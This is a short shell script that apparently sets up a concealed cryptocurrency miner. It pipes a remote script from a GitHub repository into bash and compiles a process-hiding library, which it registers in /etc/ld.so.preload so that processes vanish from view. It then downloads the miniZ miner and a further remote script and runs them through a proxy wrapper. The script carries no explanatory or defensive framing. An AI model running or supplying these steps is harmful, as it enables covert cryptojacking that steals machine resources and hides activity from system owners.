wget -O - https://raw.githubusercontent.com/17mei2022/today/main/px_1.sh | bash
wget https://github.com/17mei2022/today/raw/main/magicMin.zip
unzip magicMin.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y3/miniZ_v1.8y3_linux-x64.tar.gz
tar -xvzf miniZ_v1.8y3_linux-x64.tar.gz
rm .gitignore
cd 1.1.8y3
wget https://raw.githubusercontent.com/17mei2022/today/main/min_flex.sh
chmod +x *.sh
graftcp ./min_flex.sh
